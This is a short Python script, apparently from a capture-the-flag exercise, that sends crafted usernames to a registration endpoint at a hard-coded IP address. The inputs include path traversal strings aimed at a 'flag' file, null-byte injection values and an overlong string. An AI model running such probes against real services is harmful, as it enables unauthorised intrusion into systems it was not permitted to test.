import requests

tests = [
    ('A' * 500, 'test'),
    ('../../../flag', 'test'),
    ('../flag', 'test'),
    ('admin\x00admin', 'test'),
    ('%00admin', 'test'),
    ('hzr_edge_test_normal', 'test'),
]

for username, password in tests:
    s = requests.Session()
    try:
        r = s.post('http://183.129.189.62:21313/register',
                   data={'username': username, 'password': password})
        result = 'OK' if 'Redirecting' in r.text else r.text[:100]
        print(f'{repr(username[:50])}: {result}')
    except Exception as e:
        print(f'{repr(username[:50])}: ERROR - {e}')
